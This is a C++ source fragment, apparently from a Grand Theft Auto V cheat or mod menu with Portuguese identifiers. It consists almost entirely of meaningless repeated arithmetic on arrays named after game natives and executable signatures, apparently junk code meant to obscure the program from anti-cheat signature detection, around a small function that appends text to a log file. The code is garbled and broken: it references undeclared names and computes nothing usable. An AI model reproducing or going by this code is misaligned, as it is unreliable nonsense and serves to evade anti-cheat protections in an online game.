				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ofstream Arquivo;
			Arquivo.open(arquivoTXT, std::ios_base::app);
			Arquivo << texto << endl;
			Arquivo.close();
		}
		void ReiniciarLog()
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
